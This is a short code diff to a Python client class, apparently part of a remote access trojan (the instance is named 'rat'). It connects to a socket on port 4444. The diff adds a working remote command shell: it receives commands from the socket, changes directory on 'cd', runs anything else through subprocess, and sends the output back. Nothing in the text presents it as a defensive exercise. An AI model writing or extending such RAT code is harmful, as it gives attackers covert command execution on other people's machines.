@@ -21,11 +21,22 @@ class CLIENT:
             match command:
                 
                 case 'shell':
-                    while 1:
+                    while True:
                         command = sock.recv(1024).decode()
-                        if command == 'exit':
-                            break
-                        
+                        try:
+                            if command == "exit":
+                                break
+                            elif command[:2] == 'cd':
+                                os.chdir(command[3:])
+                                directory = os.getcwd()
+                                str_dir = str(directory)
+                                sock.send(str_dir.encode())
+                                command = ''
+                            output = subprocess.getoutput(command)
+                            sock.send(output.encode())
+                        except:
+                            err = 'bad command'
+                            sock.send(err.encode())
 rat = CLIENT('127.0.0.1', 4444)
 
 if __name__ == '__main__':
